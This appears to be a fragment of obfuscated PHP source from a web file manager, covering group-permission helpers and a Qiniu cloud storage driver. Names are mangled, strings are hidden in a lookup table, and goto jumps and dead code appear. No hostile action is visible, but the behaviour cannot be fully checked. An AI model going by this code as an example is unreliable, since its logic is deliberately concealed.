($ﬂ‹üÌñ±[$Üœø¢Ü”[1963]] == $¯áÂ€ê∫) { return 0; } $ı—‡ÒÊ’ = explode($Üœø¢Ü”[50], trim($ﬂ‹üÌñ±[$Üœø¢Ü”[592]], $Üœø¢Ü”[50])); if ($ı—‡ÒÊ’[0] == $Üœø¢Ü”[228] && count($ı—‡ÒÊ’) > $…õà∂Ü‚) { $ÏÔ⁄œªÎ = array_reverse(array_slice($ı—‡ÒÊ’, $…õà∂Ü‚)); $Ë©¨ßﬁ— = array_search($¯áÂ€ê∫, $ÏÔ⁄œªÎ); if ($Ë©¨ßﬁ— !== !1 && $Ë©¨ßﬁ— + 1 <= $µ¨ëÆÀÛ) { $µ¨ëÆÀÛ = $Ë©¨ßﬁ— + 1; } } } return $µ¨ëÆÀÛ; } private function userGroupList($Õî¶µÆ– = false) { $Ñ”∂ªﬂß =& $_SERVER[ß⁄ˆÇ†Œ]; static $ëÕãœß˙ = array(); if (isset($ëÕãœß˙[$Õî¶µÆ–])) { return $ëÕãœß˙[$Õî¶µÆ–]; } $ûÏ≥®åç = Model($Ñ”∂ªﬂß[606])->getInfo($Õî¶µÆ–); $ëÕãœß˙[$Õî¶µÆ–] = array_to_keyvalue($ûÏ≥®åç[$Ñ”∂ªﬂß[2154]], $Ñ”∂ªﬂß[1963]); return $ëÕãœß˙[$Õî¶µÆ–]; } public function userGroupParents($Ãµ–√∏Ú) { $∑¡ÎÏ„ì =& $_SERVER[ß⁄ˆÇ†Œ]; static $ì˚¸é´÷ = array(); $Ãµ–√∏Ú = $Ãµ–√∏Ú ? $Ãµ–√∏Ú : USER_ID; if (isset($ì˚¸é´÷[$Ãµ–√∏Ú])) { return $ì˚¸é´÷[$Ãµ–√∏Ú]; } $Œ•≠—à˜ = $this->userGroupList($Ãµ–√∏Ú); $´·êŸÛÔ = array(); $˙íËê·∆ = $GLOBALS[$∑¡ÎÏ„ì[6]][$∑¡ÎÏ„ì[92]][$∑¡ÎÏ„ì[2070]] == 1; $õÌì¸¯à = $˙íËê·∆ ? 3 : 2; foreach ($Œ•≠—à˜ as $Î…÷≤∑∑) { $¶ÁôˆÁÕ = array($Î…÷≤∑∑[$∑¡ÎÏ„ì[1963]]); $≥ÀèûÕê = explode($∑¡ÎÏ„ì[50], trim($Î…÷≤∑∑[$∑¡ÎÏ„ì[592]], $∑¡ÎÏ„ì[50])); if ($≥ÀèûÕê[0] == $∑¡ÎÏ„ì[228] && count($≥ÀèûÕê) > $õÌì¸¯à) { $õ≤´‹›Œ = array_slice($≥ÀèûÕê, $õÌì¸¯à); $¶ÁôˆÁÕ = array_merge($¶ÁôˆÁÕ, array_reverse($õ≤´‹›Œ)); } $´·êŸÛÔ = array_merge($´·êŸÛÔ, $¶ÁôˆÁÕ); } $ì˚¸é´÷[$Ãµ–√∏Ú] = array_unique($´·êŸÛÔ); return $ì˚¸é´÷[$Ãµ–√∏Ú]; } public function authTargetInfoMake($±øÙ≤‘⁄) { $Îôû˚ëº =& $_SERVER[ß⁄ˆÇ†Œ]; $≥Á˚õ∆Ω = array(); $ù∂Ñ÷¶∂ = array(); foreach ($±øÙ≤‘⁄ as $ø¶ÖÏ†˙) { if ($ø¶ÖÏ†˙[$Îôû˚ëº[190]] == SourceModel::TYPE_USER) { $≥Á˚õ∆Ω[] = intval($ø¶ÖÏ†˙[$Îôû˚ëº[577]]); } else { if ($ø¶ÖÏ†˙[$Îôû˚ëº[190]] == SourceModel::TYPE_GROUP) { $ù∂Ñ÷¶∂[] = intval($ø¶ÖÏ†˙[$Îôû˚ëº[577]]); } } } if ($≥Á˚õ∆Ω) { $≥Á˚õ∆Ω = Model($Îôû˚ëº[585])->userListInfo($≥Á˚õ∆Ω); } if ($ù∂Ñ÷¶∂) { $¸œ´Ô˜ı = array($Îôû˚ëº[2055] => array($Îôû˚ëº[500], $ù∂Ñ÷¶∂)); $ù∂Ñ÷¶∂ = Model($Îôû˚ëº[593])->field($Îôû˚ëº[2184])->where($¸œ´Ô˜ı)->select(); $ù∂Ñ÷¶∂ = array_to_keyvalue($ù∂Ñ÷¶∂, $Îôû˚ëº[1963]); } return array($Îôû˚ëº[2185] => $≥Á˚õ∆Ω, $Îôû˚ëº[2186] => $ù∂Ñ÷¶∂); } public function authInfo($ÑΩÊÜÜƒ) { $◊⁄Ì∆ßñ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ÑΩÊÜÜƒ[$◊⁄Ì∆ßñ[2071]]) { $≥€˘æóî = Model($◊⁄Ì∆ßñ[579])->listData($ÑΩÊÜÜƒ[$◊⁄Ì∆ßñ[2071]]); if (!$≥€˘æóî) { return !1; $ã±Í„Ù¿ = Model($◊⁄Ì∆ßñ[579])->listData(); $˝ãä…”Á = array_filter_by_field($ã±Í„Ù¿, $◊⁄Ì∆ßñ[495], $◊⁄Ì∆ßñ[228]); return $˝ãä…”Á; } $äÙ˜í±ı = array_field_key($≥€˘æóî, array($◊⁄Ì∆ßñ[483], $◊⁄Ì∆ßñ[32], $◊⁄Ì∆ßñ[495], $◊⁄Ì∆ßñ[1986], $◊⁄Ì∆ßñ[1987])); $äÙ˜í±ı[$◊⁄Ì∆ßñ[2187]] = $ÑΩÊÜÜƒ; return $äÙ˜í±ı; } else { return array($◊⁄Ì∆ßñ[501] => 0, $◊⁄Ì∆ßñ[1969] => $ÑΩÊÜÜƒ[$◊⁄Ì∆ßñ[2131]], $◊⁄Ì∆ßñ[502] => $◊⁄Ì∆ßñ[12], $◊⁄Ì∆ßñ[1986] => $◊⁄Ì∆ßñ[2188]); } } } goto e™Ó¡ïúõÑ; eüãÕ≠æÃô: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÙÀ÷ˆ¨ê) { parent::__construct(); require_once SDK_DIR . $_SERVER[ß⁄ˆÇ†Œ][1522]; $this->_init($ÙÀ÷ˆ¨ê); } public function _init($ú‹„Ù‘») { $›°ª‰øƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->config = $ú‹„Ù‘»; foreach ($ú‹„Ù‘» as $áﬁ¿ËÔÒ => $˘»ä…√†) { if (isset($this->{$áﬁ¿ËÔÒ})) { $this->{$áﬁ¿ËÔÒ} = $˘»ä…√†; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($›°ª‰øƒ[1523] . LNG($›°ª‰øƒ[1458])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ï”“©ù˘, $»Òˆ≤˛’ = '', $‚∂Ê·≈ﬁ = REPEAT_RENAME) { if ($this->setContent($Ï”“©ù˘, $»Òˆ≤˛’)) { return $this->getPathOuter($Ï”“©ù˘); } return !1; } public function mkdir($Å“•ÀÈ, $ù˘Ü≈∑â = REPEAT_SKIP) { $£’§çÍ£ =& $_SERVER[ß⁄ˆÇ†Œ]; $˙ıä¸ÍÒ = trim($Å“•ÀÈ, $£’§çÍ£[8]); if ($this->_isFolder($˙ıä¸ÍÒ)) { return $this->getPathOuter($˙ıä¸ÍÒ); } $Å“•ÀÈ = $˙ıä¸ÍÒ . $£’§çÍ£[8]; $¬¥√≈€à = get_path_this($˙ıä¸ÍÒ); $ˆﬂ¿éµ« = $Å“•ÀÈ . $¬¥√≈€à; if (!$this->mkfile($ˆﬂ¿éµ«)) { return !1; } if (!$this->moveFile($ˆﬂ¿éµ«, $Å“•ÀÈ)) { $this->delFile($ˆﬂ¿éµ«); return !1; } return $this->getPathOuter($˙ıä¸ÍÒ); } public function copyFile($ÇôíÀãß, $üΩº˙¡û) { $ø÷ø≈’á = $this->bucketManager->copy($this->bucket, $ÇôíÀãß, $this->bucket, $üΩº˙¡û, !0); return $ø÷ø≈’á ? !1 : $this->getPathOuter($üΩº˙¡û); } public function moveFile($¶∞é√ò”, $•´“ç„ì) { $≤È±“¯© = $this->bucketManager->move($this->bucket, $¶∞é√ò”, $this->bucket, $•´“ç„ì, !0); return $≤È±“¯© ? !1 : $this->getPathOuter($•´“ç„ì); } public function delFile($≥∂≥®⁄ü) { if (!$this->exist($≥∂≥®⁄ü)) { return !0; } $º÷åøïñ = $this->bucketManager->delete($this->bucket, $≥∂≥®⁄ü); return $º÷åøïñ ? !1 : !0; } public function delFolder($á™¸˜“›) { $¡πΩãá∏ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->exist($á™¸˜“›)) { return !0; } $this->listItemCache = !1; $∂˜¥∂ˆ≈ = $this->fileList($á™¸˜“›); $this->listItemCache = !0; $÷È¿áâã = trim($á™¸˜“›, $¡πΩãá∏[8]) . $¡πΩãá∏[8]; if (!empty($á™¸˜“›) && $á™¸˜“› !== $¡πΩãá∏[228] && !in_array($÷È¿áâã, $∂˜¥∂ˆ≈[$¡πΩãá∏[85]])) { $∂˜¥∂ˆ≈[$¡πΩãá∏[85]][] = $÷È¿áâã; } $êıﬂÀ¿ê = $this->delByBatch($∂˜¥∂ˆ≈[$¡πΩãá∏[86]]); if (!$êıﬂÀ¿ê) { return !1; } $êıﬂÀ¿ê = $this->delByBatch($∂˜¥∂ˆ≈[$¡πΩãá∏[85]]); if (!$êıﬂÀ¿ê) { return !1; } return $this->delFile($÷È¿áâã); } private function delByBatch($Á–∂£¯ä) { foreach (array_chunk($Á–∂£¯ä, 1000) as $Â¡Ñ›≠Ù) { $‡©ø“Òï = $this->bucketManager->buildBatchDelete($this->bucket, $Â¡Ñ›≠Ù); list($ÊÀØé˛ã, $Îæ“≠ƒÙ) = $this->bucketManager->batch($‡©ø“Òï); if ($Îæ“≠ƒÙ) { return !1; } } return !0; } public function rename($ﬁ»ﬂ…€Ä, $∂≠ãÉÆñ) { return $this->renameObject($ﬁ»ﬂ…€Ä, $∂≠ãÉÆñ); } public function fileInfo($€ŒûÎƒô, $ú˚˛ŸﬂÓ = false, $≥‰˚û÷à = array()) { $Ô˝úÓòâ =& $_SERVER[ß⁄ˆÇ†Œ]; $ã≠˝ıƒ· = array($Ô˝úÓòâ[32] => $this->pathThis($€ŒûÎƒô), $Ô˝úÓòâ[87] => $this->getPathOuter($Ô˝úÓòâ[8] . $€ŒûÎƒô), $Ô˝úÓòâ[33] => $Ô˝úÓòâ[230], $Ô˝úÓòâ[79] => isset($≥‰˚û÷à[$Ô˝úÓòâ[1524]]) ? $≥‰˚û÷à[$Ô˝úÓòâ[1524]] : 0, $Ô˝úÓòâ[169] => $this->ext($€ŒûÎƒô)); if ($ú˚˛ŸﬂÓ) { return $ã≠˝ıƒ·; } $ã≠˝ıƒ·[$Ô˝úÓòâ[231]] = $ã≠˝ıƒ·[$Ô˝úÓòâ[88]] = 0; $ã≠˝ıƒ·[$Ô˝úÓòâ[232]] = $ã≠˝ıƒ·[$Ô˝úÓòâ[233]] = !0; if (empty($≥‰˚û÷à)) { $≥‰˚û÷à = $this->objectMeta($€ŒûÎƒô); if (!$≥‰˚û÷à) { return $ã≠˝ıƒ·; } } if (isset($≥‰˚û÷à[$Ô˝úÓòâ[234]]) && $≥‰˚û÷à[$Ô˝úÓòâ[234]]) { $ã≠˝ıƒ·[$Ô˝úÓòâ[235]] = $≥‰˚û÷à[$Ô˝úÓòâ[234]]; } if (isset($≥‰˚û÷à[$Ô˝úÓòâ[245]]) && $≥‰˚û÷à[$Ô˝úÓòâ[245]]) { $ã≠˝ıƒ·[$Ô˝úÓòâ[235]] = $≥‰˚û÷à[$Ô˝úÓòâ[245]]; } if (isset($≥‰˚û÷à[$Ô˝úÓòâ[1525]])) { $ã≠˝ıƒ·[$Ô˝úÓòâ[88]] = substr($≥‰˚û÷à[$Ô˝úÓòâ[1525]] . $Ô˝úÓòâ[12], 0, 10); } if (isset($≥‰˚û÷à[$Ô˝úÓòâ[1524]])) { $ã≠˝ıƒ·[$Ô˝úÓòâ[79]] = $≥‰˚û÷à[$Ô˝úÓòâ[1524]]; } return $ã≠˝ıƒ·; } public function folderInfo($ÙÁ¶ÂíÃ, $“∑úıü» = false) { $®ˆëÆ≠§ =& $_SERVER[ß⁄ˆÇ†Œ]; $É¸ı∂ˆ† = array($®ˆëÆ≠§[32] => $this->pathThis($ÙÁ¶ÂíÃ), $®ˆëÆ≠§[87] => $this->getPathOuter($®ˆëÆ≠§[8] . $ÙÁ¶ÂíÃ), $®ˆëÆ≠§[33] => $®ˆëÆ≠§[78]); if ($“∑úıü») { return $É¸ı∂ˆ†; } $É¸ı∂ˆ†[$®ˆëÆ≠§[231]] = $É¸ı∂ˆ†[$®ˆëÆ≠§[88]] = 0; $É¸ı∂ˆ†[$®ˆëÆ≠§[232]] = $É¸ı∂ˆ†[$®ˆëÆ≠§[233]] = !0; $ÙÁ¶ÂíÃ = rtrim($ÙÁ¶ÂíÃ, $®ˆëÆ≠§[8]) . $®ˆëÆ≠§[8]; $Ä€é©èê = $this->objectMeta($ÙÁ¶ÂíÃ); if (isset($Ä€é©èê[$®ˆëÆ≠§[1525]])) { $É¸ı∂ˆ†[$®ˆëÆ≠§[88]] = substr($Ä€é©èê[$®ˆëÆ≠§[1525]] . $®ˆëÆ≠§[12], 0, 10); } return $É¸ı∂ˆ†; } public function listPath($ñá ñπ“, $∆›î¶‚∫ = false) { $Ìã“çç· =& $_SERVER[ß⁄ˆÇ†Œ]; $¯¢∏ƒÒù = $this->fileList($ñá ñπ“, $Ìã“çç·[8], !0); foreach ($¯¢∏ƒÒù[$Ìã“çç·[85]] as $ÛúãË»Õ => $éÂ∆»∑Ï) { $¯¢∏ƒÒù[$Ìã“çç·[85]][$ÛúãË»Õ] = $this->folderInfo($éÂ∆»∑Ï, $∆›î¶‚∫); } foreach ($¯¢∏ƒÒù[$Ìã“çç·[86]] as $ÛúãË»Õ => $éÂ∆»∑Ï) { $¯¢∏ƒÒù[$Ìã“çç·[86]][$ÛúãË»Õ] = $this->fileInfo($éÂ∆»∑Ï[$Ìã“çç·[97]], $∆›î¶‚∫, $éÂ∆»∑Ï); } return $¯¢∏ƒÒù; } public function has($˛Ç£Ÿ“Ì, $ó¥Üåã˘ = false, $ù˚ÔÜË∑ = true) { $ÖˆÚ©˛Ä =& $_SERVER[ß⁄ˆÇ†Œ]; $˛Ç£Ÿ“Ì = trim($˛Ç£Ÿ“Ì, $ÖˆÚ©˛Ä[8]); $œœÙêÏÚ = empty($˛Ç£Ÿ“Ì) && $˛Ç£Ÿ“Ì !== $ÖˆÚ©˛Ä[228] ? $ÖˆÚ©˛Ä[12] : $˛Ç£Ÿ“Ì . $ÖˆÚ©˛Ä[8]; $™Ì‹¢©ô = $ÖˆÚ©˛Ä[12]; $ı»‡≤Á“ = 500; $¬ÃÎ≤ﬂ‹ = $ÖˆÚ©˛Ä[8]; $∆è–¸·º = $∂”Ë–È‡ = 0; while (!0) { check_abort(); list($í·‹ÙÔ∆, $Ò§∞¬®¨) = $this->bucketManager->listFiles($this->bucket, $œœÙêÏÚ, $™Ì‹¢©ô, $ı»‡≤Á“, $¬ÃÎ≤ﬂ‹); if ($Ò§∞¬®¨) { break; } $™Ì‹¢©ô = array_key_exists($ÖˆÚ©˛Ä[1470], $í·‹ÙÔ∆) ? $™Ì‹¢©ô = $í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1526]] : $ÖˆÚ©˛Ä[12]; if ($ó¥Üåã˘) { if (!empty($í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1527]])) { $∆è–¸·º += count($í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1527]]); } if (!empty($í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1528]])) { $∂”Ë–È‡ += count($í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1528]]); } if ($™Ì‹¢©ô === $ÖˆÚ©˛Ä[12]) { break; } continue; } if ($ù˚ÔÜË∑) { if (!empty($í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1527]])) { return !0; } } else { if (!empty($í·‹ÙÔ∆[$ÖˆÚ©˛Ä[1528]])) { return !0; } } if ($™Ì‹¢©ô === $ÖˆÚ©˛Ä[12]) { break; } } if ($ó¥Üåã˘) { return array($ÖˆÚ©˛Ä[239] => $∆è–¸·º, $ÖˆÚ©˛Ä[240] => $∂”Ë–È‡); } return !1; } public function listAll($ç–õËÀÆ) { $Î≈Òü†Ä =& $_SERVER[ß⁄ˆÇ†Œ]; $“ŒÔáµ• = $this->fileList($ç–õËÀÆ, $Î≈Òü†Ä[12], !0); $¥©ä°ﬁ∑ = array_to_keyvalue($“ŒÔáµ•[$Î≈Òü†Ä[86]], $Î≈Òü†Ä[32]); foreach ($“ŒÔáµ•[$Î≈Òü†Ä[85]] as $ìúë˝Ãî) { if (is_string($ìúë˝Ãî)) { $¥©ä°ﬁ∑[$ìúë˝Ãî] = array($Î≈Òü†Ä[79] => 0); } } return $this->listAllFiles($ç–õËÀÆ, $¥©ä°ﬁ∑); } private function fileList($≥»¯√”Ç, $Õ°Ö’˘± = '', $—ØÏ˙ıä = 0) { $ê®õ’õ =& $_SERVER[ß⁄ˆÇ†Œ]; $≥»¯√”Ç = trim($≥»¯√”Ç, $ê®õ’õ[8]); $Ó‹∆È·Ï = empty($≥»¯√”Ç) && $≥»¯√”Ç !== $ê®õ’õ[228] ? $ê®õ’õ[12] : $≥»¯√”Ç . $ê®õ’õ[8]; $ÊàŸø‹Ë = $ê®õ’õ[12]; $¯åøÌ∏û = 1000; $ﬂæ›‚ÿº = $·©π˘†Ù = array(); while (!0) { check_abort(); list($Íá’Ôï√, $‹ı∆ÀòÚ) = $this->bucketManager->listFiles($this->bucket, $Ó‹∆È·Ï, $ÊàŸø‹Ë, $¯åøÌ∏û, $Õ°Ö’˘±); if ($‹ı∆ÀòÚ) { break; } $ÊàŸø‹Ë = array_key_exists($ê®õ’õ[1470], $Íá’Ôï√) ? $ÊàŸø‹Ë = $Íá’Ôï√[$ê®õ’õ[1526]] : $ê®õ’õ[12]; $õÚ®ÙÕø = isset($Íá’Ôï√[$ê®õ’õ[1527]]) ? $Íá’Ôï√[$ê®õ’õ[1527]] : array(); $©üç÷ÊÍ = isset($Íá’Ôï√[$ê®õ’õ[1528]]) ? $Íá’Ôï√[$ê®õ’õ[1528]] : array(); foreach ($õÚ®ÙÕø as $≈ïƒöÜÅ) { if ($≈ïƒöÜÅ[$ê®õ’õ[97]] == $Ó‹∆È·Ï) { continue; } $«˘ÕÓ≥∑ = $≈ïƒöÜÅ[$ê®õ’õ[97]]; $–óÕ∆î∆ = $≈ïƒöÜÅ[$ê®õ’õ[1524]]; $≈ïƒöÜÅ[$ê®õ’õ[79]] = $–óÕ∆î∆; $øÍ»Ω≥˘ = $–óÕ∆î∆ == 0 && substr($«˘ÕÓ≥∑, strlen($«˘ÕÓ≥∑) - 1, 1) == $ê®õ’õ[8] ? !0 : !1; $this->cacheMethodInfoSet($«˘ÕÓ≥∑, $øÍ»Ω≥˘, $≈ïƒöÜÅ); if ($øÍ»Ω≥˘) { $ﬂæ›‚ÿº[] = $«˘ÕÓ≥∑; continue; } $·©π˘†Ù[] = $—ØÏ˙ıä ? $≈ïƒöÜÅ : $«˘ÕÓ≥∑; } foreach ($©üç÷ÊÍ as $«˘ÕÓ≥∑) { if ($«˘ÕÓ≥∑ == $Ó‹∆È·Ï) { continue; } $ﬂæ›‚ÿº[] = $«˘ÕÓ≥∑; $this->cacheMethodInfoSet($«˘ÕÓ≥∑, !0); } if ($ÊàŸø‹Ë === $ê®õ’õ[12]) { break; } } $this->cacheMethodInfoSet($≥»¯√”Ç, !0); return array($ê®õ’õ[85] => $ﬂæ›‚ÿº, $ê®õ’õ[86] => $·©π˘†Ù); } public function canRead($€∂êò√’) { return $this->exist($€∂êò√’) ? !0 : !1; } public function canWrite($Óáéè·ì) { return $this->exist($Óáéè·ì) ? !0 : !1; } public function getContent($™¶⁄Â•ß) { return $this->fileSubstr($™¶⁄Â•ß, 0, -1); } public function setContent($√Àªﬁéñ, $ÔÔ¿†Æ¸ = '') { $⁄Å±ƒ§… = $this->tempFile($this->pathThis($√Àªﬁéñ)); file_put_contents($⁄Å±ƒ§…, $ÔÔ¿†Æ¸); if ($this->upload($√Àªﬁéñ, $⁄Å±ƒ§…)) { $this->tempFileRemve($⁄Å±ƒ§…); return !0; } return !1; } public function refreshUrls($œÉù¶…Ç) { $Òƒ€™Ä⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $´öáÆã« = array(); if (is_array($œÉù¶…Ç)) { foreach ($œÉù¶…Ç as $Ìïñëıñ) { $´öáÆã«[] = $this->link($Ìïñëıñ); } } else { $´öáÆã«[] = $this->link($œÉù¶…Ç); } $ò¯ˆÒ«ù = new Qiniu\Cdn\CdnManager($this->auth); list($‡±â«≥ñ, $ç¿ÂƒÂ˘) = $ò¯ˆÒ«ù->refreshUrls($´öáÆã«); if ($ç¿ÂƒÂ˘) { return !1; } return $‡±â«≥ñ[$Òƒ€™Ä⁄[1260]] == $Òƒ€™Ä⁄[832] ? !0 : !1; } public function fileSubstr($˘˙¨≈øÉ, $àåäƒ€ö, $˘ÇÄö–Ω) { $˚ºƒèƒ√ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!($π§ﬁæ¸Ã = $this->link($˘˙¨≈øÉ))) { return !1; } $´ë“◊˝ô = !1; if ($˘ÇÄö–Ω > 0) { $∏Ë“Ôû– = $àåäƒ€ö + $˘ÇÄö–Ω - 1; $´ë“◊˝ô = array($˚ºƒèƒ√[1529] . $àåäƒ€ö . $˚ºƒèƒ√[470] . $∏Ë“Ôû–); } $…“—ﬂ˙® = url_request($π§ﬁæ¸Ã, $˚ºƒèƒ√[261], !1, $´ë“◊˝ô); return $…“—ﬂ˙®[$˚ºƒèƒ√[823]] ? $…“—ﬂ˙®[$˚ºƒèƒ√[1283]] : !1; } public function upload($√¥Í∞∆ú, $Ô√ÆúÔÚ, $ó†÷˛µÈ = false, $Û≈ÆŒ„– = REPEAT_REPLACE) { $´ﬁ˜≠‡ß = new Qiniu\Storage\UploadManager(); $Ñú—±Ú = $this->auth->uploadToken($this->bucket, $√¥Í∞∆ú); $ıî≈∏ÆÍ = get_file_mime(get_path_ext($Ô√ÆúÔÚ)); list($≤‡Ω€Œ«, $ªêï…Îä) = $´ﬁ˜≠‡ß->putFile($Ñú—±Ú, $√¥Í∞∆ú, $Ô√ÆúÔÚ, null, $ıî≈∏ÆÍ); return $ªêï…Îä ? !1 : $this->getPathOuter($√¥Í∞∆ú); } public function uploadFormData($ÊÜÂ∂∞á, $˛ü≤Ìæ = 3600) { return $this->uploadToken($ÊÜÂ∂∞á, $˛ü≤Ìæ); } public function multiUploadFormData($¸È˝∑é˚, $ãà˛»Î¡ = 3600) { return $this->uploadToken($¸È˝∑é˚, $ãà˛»Î¡); } private function uploadToken($¿µñ¨‰ú, $˛Ä§“ﬂâ = 3600) { $ıïÇâﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; $å‘íò•œ = $˛Ä§“ﬂâ; $∑Õ˛¶‡¡ = array($ıïÇâﬂ[1530] => $ıïÇâﬂ[1531]); $√ÃÔ˛∞ï = $¿µñ¨‰ú; $é¡¡≠ì° = $this->auth->uploadToken($this->bucket, $√ÃÔ˛∞ï, $å‘íò•œ, $∑Õ˛¶‡¡, !0); $¶ÔÆ†¨Å = empty($this->region) || $this->region == $ıïÇâﬂ[1532] ? $ıïÇâﬂ[12] : $ıïÇâﬂ[470] . $this->region; $÷Á®Ã˛‰ = http_type() . "\72\57\57\165\x70\154\157\x61\144{$¶ÔÆ†¨Å}\56\161\151\x6e\151\x75\x70\x2e\143\157\x6d\57"; return array($ıïÇâﬂ[1533] => $é¡¡≠ì°, $ıïÇâﬂ[1534] => $÷Á®Ã˛‰); } public function download($íˆù˜¸Ø, $ƒ£ØÅ¨≈) { $Í—®÷˝˛ = IO::getPathInner(IO::mkfile($ƒ£ØÅ¨≈)); if (!($Üõî∑ë· = $this->link($íˆù˜¸Ø))) { return !1; } $ ‡Ÿ’Í— = 0; $∂∏¿⁄µÓ = 1024 * 200; $ﬂµ¨ÉÒˆ = fopen($Í—®÷˝˛, $_SERVER[ß⁄ˆÇ†Œ][1535]); while (!0) { $å·Ωùéë = $this->fileSubstr($íˆù˜¸Ø, $ ‡Ÿ’Í—, $∂∏¿⁄µÓ); if ($å·Ωùéë === !1) { return !1; } fwrite($ﬂµ¨ÉÒˆ, $å·Ωùéë); $ ‡Ÿ’Í— += $∂∏¿⁄µÓ; if (strlen($å·Ωùéë) < $∂∏¿⁄µÓ) { break; } } fclose($ﬂµ¨ÉÒˆ); return $ƒ£ØÅ¨≈; } public function link($ñÏ¯ÇÈü, $ﬂ•¬Ù≈≠ = '') { if (!$this->isFile($ñÏ¯ÇÈü)) { return !1; } $ÅˆÕâÉ≥ = $this->getHost() . $_SERVER[ß⁄ˆÇ†Œ][8] . $this->pathEncode($ñÏ¯ÇÈü) . $ﬂ•¬Ù≈≠; return $this->auth->privateDownloadUrl($ÅˆÕâÉ≥, 3600 * 12); } public function fileOut($Ôªˆ°Õ…, $Òéæ–Ãß = false, $Ë˘´≤ Á = false, $ËË˚∏Å = '') { $Å≈æ˘–Æ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ôªˆ°Õ…, $Òéæ–Ãß, $Ë˘´≤ Á, $ËË˚∏Å); } if (!$Ë˘´≤ Á) { $Ë˘´≤ Á = $this->pathThis($Ôªˆ°Õ…); } $å¨Í£›∏ = $Òéæ–Ãß ? $Å≈æ˘–Æ[1536] . rawurlencode($Ë˘´≤ Á) : $Å≈æ˘–Æ[12]; $π¢˜çÁﬂ = $this->link($Ôªˆ°Õ…, $å¨Í£›∏); $this->fileOutLink($π¢˜çÁﬂ); } public function fileOutServer($’¯íß∑‰, $Ø∞ö‘˜û = false, $ÂÄ÷üÿˆ = false, $’à€◊„Ô = '') { parent::fileOut($’¯íß∑‰, $Ø∞ö‘˜û, $ÂÄ÷üÿˆ, $’à€◊„Ô); } public function fileOutImage($Ùìﬂ∞∂É, $É≤ÃÁ•¸ = 250) { if ($this->size($Ùìﬂ∞∂É) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ùìﬂ∞∂É, $É≤ÃÁ•¸); } $ìÈ≠π°— = $this->link($Ùìﬂ∞∂É, $_SERVER[ß⁄ˆÇ†Œ][1537] . $É≤ÃÁ•¸); $this->fileOutLink($ìÈ≠π°—); } public function fileOutImageServer($•ﬁﬁ»º¸, $Òª∏Ü∫’ = 250) { parent::fileOutImage($•ﬁﬁ»º¸, $Òª∏Ü∫’); } public function hashMd5($‰â„©ìƒ) { $Å≈ß£¬· =& $_SERVER[ß⁄ˆÇ†Œ]; $·⁄ÙÂÎà = $this->objectMeta($‰â„©ìƒ); return isset($·⁄ÙÂÎà[$Å≈ß£¬·[245]]) ? $·⁄ÙÂÎà[$Å≈ß£¬·[245]] : !1; $ôà—Ω‰§ = $this->link($‰â„©ìƒ, $Å≈ß£¬·[1538]); } public function size($ô†Ã¨“∑) { $¶ı¿äÛ” = $this->objectMeta($ô†Ã¨“∑); return $¶ı¿äÛ” ? $¶ı¿äÛ”[$_SERVER[ß⁄ˆÇ†Œ][79]] : 0; } public function info($à˘˚∞…ï) { if ($this->isFolder($à˘˚∞…ï)) { return $this->folderInfo($à˘˚∞…ï); } else { if ($this->isFile($à˘˚∞…ï)) { return $this->fileInfo($à˘˚∞…ï); } } return !1; } public function exist($ã«Õ¿Å–) { return $this->isFile($ã«Õ¿Å–) || $this->isFolder($ã«Õ¿Å–); } public function isFile($Ë∫¨õøä) { return !$this->isFolder($Ë∫¨õøä) && $this->objectMeta($Ë∫¨õøä); } public function isFolder($ÛµÃå∂™) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][179], $ÛµÃå∂™); } protected function objectMeta($ûÖë≠≤ª) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][181], $ûÖë≠≤ª); } protected function _objectMeta($Èâ”¸Ì®) { $êõÔµÒÓ =& $_SERVER[ß⁄ˆÇ†Œ]; list($ˆ°Ô∑â†, $êåëáªµ) = $this->bucketManager->stat($this->bucket, $Èâ”¸Ì®); if ($ˆ°Ô∑â†) { $ˆ°Ô∑â†[$êõÔµÒÓ[79]] = intval($ˆ°Ô∑â†[$êõÔµÒÓ[1524]]); } return $ˆ°Ô∑â†; } protected function _isFolder($Ïóéßπ˚) { $ˆ˜ìîï™ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($Ïóéßπ˚ == $ˆ˜ìîï™[12] || $Ïóéßπ˚ == $ˆ˜ìîï™[8]) { return !0; } list($î€îÇ≤§, $’°´∞…’) = $this->bucketManager->listFiles($this->bucket, trim($Ïóéßπ˚, $ˆ˜ìîï™[8]) . $ˆ˜ìîï™[8], $ˆ˜ìîï™[12], 1, $ˆ˜ìîï™[8]); return !empty($î€îÇ≤§[$ˆ˜ìîï™[1527]]) || !empty($î€îÇ≤§[$ˆ˜ìîï™[1528]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($òò˝Ñ–Ö, $˜í∆œ‡˚ = 0) { parent::__construct(); $this->source = $òò˝Ñ–Ö; $this->sourceSize = $˜í∆œ‡˚; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function 